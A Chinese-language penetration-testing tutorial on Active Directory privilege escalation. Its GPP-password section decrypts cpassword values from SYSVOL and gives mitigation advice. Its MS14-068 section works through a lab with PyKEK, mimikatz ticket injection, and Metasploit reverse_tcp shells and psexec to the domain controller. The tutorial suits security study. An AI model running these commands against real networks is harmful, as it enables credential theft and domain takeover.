## 0x00 前言
攻击者可以通过多种方式在Active Directory中获得域管理员权限, 这篇文章是为了描述当前使用的一些当前热门的内容,
这里描述的技术“假设违规”，攻击者已经在内部系统上获得权限，并获得域用户认证凭据（又称后渗透利用）。  
对于大多数企业而言，不幸的事实是，攻击者通常不会花更长时间从普通域用户转到域管理员。受害者的问题是："这是怎么发生的？"。攻击者经常以鱼叉式的钓鱼电子邮件开始给一个或多个用户发送邮件，使被攻击者能够在目标网络中的计算机上运行他们的代码。一旦攻击者的代码在企业内部运行，第一步是进行信息收集，以发现有用的资源来进行提权、持久性攻击，当然，还包括截取信息。  
虽然整个过程细节各不相同，但总体框架仍然存在：  
**1.恶意软件注入（网络钓鱼，网络攻击，等等）**  
**2.信息探测（内部）**  
**3.凭据盗窃**  
**4.攻击与权限提升**  
**5.数据访问和泄露**  
**6.持久性（会话访问）**  
我们从攻击者获取到企业内部普通权限开始，因为在当前环境网络中通常并不困难，此外，攻击者通常也不难从普通客服端上的用户权限提升为具有本地管理员权限。此用户提权可以通过利用系统上未修补的补丁漏洞或更频繁地发现在SYSVOL中查找到本地管理员的密码，例如组策略首选项。
## 0x01 SYSVOL和组策略首选项中的密码获取
这种方法是最简单的，因为不需要特殊的“黑客”工具，所有的攻击方法必须是打开Windows资源管理器并搜索域名为SYSVOL
DFS共享的XML文件。在大多数情况下，XML格式的文件包含密码凭据有：groups.xml，scheduledtasks.xml和＆Services.xml等很文件。SYSVOL是Active
Directory中的所有经过身份认证的用户具有可读可访问权限的域共享目录文件。SYSVOL包含登录脚本，组策略数据以及需要在具有任何域控制器地方可用的域数据（由于SYSVOL在所有域控制器之间自动同步并共享）。所有域组策略都存储的位置：\\SYSVOL\
\ Policies \
当创建新的GPP时，就会在SYSVOL中创建一个与相关配置数据关联的XML文件，如果提供了密码，那么AES-256位加密应是足够强的。微软在MSDN上发布了可用于解密密码的AES加密密钥（共享密钥），连接地址：  
（可用于解密密码）由于经过身份认证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的可读权限，所以域中的任何人都可以搜索包含“cpassword”关键字的XML文件中的SYSVOL共享，该文件是包含AES加密密码值。
通过访问此XML文件，攻击者可以使用AES私钥来解密GPP密码，  
PowerSploit项目中的Get-GPPPassword脚本可用来解密，其连接地址为：  
使用方法：  
powershell import-modulo .\Get-GPPpassword.ps1;Get-GppPassword  
以下截图显示了从SYSVOL中的XML文件解密GPP密码：
其他文件类型也可具有解密（通常为明文），如vbs和bat。
**安全建议：**
  * 在用于管理GPO的每台计算机上安装KB2962486补丁，以防止新的凭据被写入到组策略首选项中
  * 删除包含密码的SYSVOL中出现的GPP xml文件。
  * 不要将密码放在所有未经过身份验证的用户可访问的文件中。
## 0x02 利用域控制器上的MS14-068 Kerberos漏洞
自从MS14-068被修补了KB3011780补丁以来。有可用的检测方法来确保使用MS14-068的尝试被识别，但是，这并不意味着域控制器打了补丁或检查已正确配置。大多数企业在补丁发布的一个月内使用KB3011780进行了修补域控制器，然而，并不是所有的都确保每个新的域控制器都安装了补丁，才能成为一个安全的DC域控制器。  
感谢Gavin Millard（@gmillard在Twitter上），在这下面的截图中，更好地阐述了这个问题：
简单地说，利用MS14-068攻击需要不到5分钟的时间，使攻击者重写一个有效的Kerberos
TGT身份验证机票，并且，使其成为域管理员（和企业管理员）。如上图所示，这就像采取有效的登机密码，在登机前，写上“飞行员”。
然后在登机时，你被护送到驾驶舱，问你是否在起飞前要喝咖啡。  
第一次发布的MS14-068漏洞是在发布补丁后的2周，由SylvainMonné（@BiDOrD）撰写，称为PyKEK（[https://github.com/bidord/pykek/archive/master.zip），](https://github.com/bidord/pykek/archive/master.zip%EF%BC%89%EF%BC%8C)
PyKEK是一个Python脚本，可以在网络上的任何地方运行具有安装python程序的系统，只要在未打补丁的DC域中使用PyKEK生成ccache文件，并使用Mimikatz将TGT注入到内存中，提升为域管理员！使用这张票，可以无需密码访问DC域控制器上的admin
$ 或者c$共享。
**测试环境：**
**kalix86 IP 地址：192.168.1.102 未加入域能和win2008r2通信**
**win7x86 ip 地址：192.168.1.108 加入到域bk.com,普通域账号test 登录**
**win2008r2x64 ip 地址：192.168.1.106 DC域控制器，主机名为：DC.bk.com**
**具体步骤如下：**
1.导出当前登录账号test的sid值：
whoami/all>sid.txt
2.查看当前域控主机名：
dsquery server && net time /domain
3.生成TGT:
python ms14-068.py -u PI:EMAIL -s
S-1-5-21-3151896982-173628731-3220273337-1007 -d DC. bk.com
4.注入生成的TGT并获得有效的TGS：
mimikatz.exe "kerberos::ptc PI:EMAIL" exit
注意：只有当同一个Active Directory站点中有一个未打补丁的主DC和一个已修补的副DC时，PyKEK才有时会成功。成功的利用取决于什么DC
PyKEK连接到。所有漏洞利用阶段都可以在没有管理员帐户的情况下执行，并且可以在网络上的任何计算机上执行（包括未加入域的计算机）。
**获取TGA的方法：**
**在windows系统下：**
python ms14-068.py -u PI:EMAIL -s
S-1-5-21-3151896982-173628731-3220273337-1007 -d DC. bk.com
**在kali系统下：**  
Kali下面默认还没有安装kerberos的认证功能，所以我们首先要安装一个kerberos客户端：  
apt-get install krb5-user  
然后手动设置IP地址，并将本机的DNS设置为目标域控制器主机的IP地址，这里设置为DC.bk.com对应主机IP：192.168.1.106
**在msf下：**  
msf > use auxiliary/admin/kerberos/ms14_068_kerberos_checksum  
msf>show optionsmsf auxiliary(ms14_068_kerberos_checksum) > set DOMAIN bk.com  
msf auxiliary(ms14_068_kerberos_checksum) > set PASSWORD PI:EMAIL  
msf auxiliary(ms14_068_kerberos_checksum) > set USER test  
msf auxiliary(ms14_068_kerberos_checksum) > set USER_SID
S-1-5-21-3151896982-173628731-3220273337-1007  
msf auxiliary(ms14_068_kerberos_checksum) > set RHOST DC.bk.com  
msf auxiliary(ms14_068_kerberos_checksum) > run
mimikatz #  
kerberos::clist "
20170712232847_default_192.168.1.106_windows.kerberos_515998.bin" /export  
msf auxiliary(ms14_068_kerberos_checksum) > use exploit/multi/handler  
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
msf exploit(handler) > set lhost 192.168.1.102  
msf exploit(handler) > exploit  
meterpreter > getuid  
meterpreter > load kiwi  
meterpreter > kerberos_ticket_use /tmp/PI:EMAIL  
meterpreter > background  
msf exploit(handler) > sessions  
msf exploit(handler) > use exploit/windows/local/current_user_psexec  
msf exploit(current_user_psexec) > set TECHNIQUE PSH  
msf exploit(current_user_psexec) > set RHOSTS DC.bk.com  
msf exploit(current_user_psexec) > set payload windows/meterpreter/reverse_tcp  
msf exploit(current_user_psexec) > set lhost 192.168.1.102  
msf exploit(current_user_psexec) > set SESSION 1  
msf exploit(current_user_psexec) > exploit  
meterpreter > getuid
**MS14-068 漏洞利用过程：**
  1. 请求没有PAC作为普通用户的Kerberos TGT身份验证凭证，DC使用TGT进行回复
  2. 生成一个没有密钥伪造的PAC，所以生成PAC域用户密码数据是使用MD5算法而不是HMAC_MD5“签名”。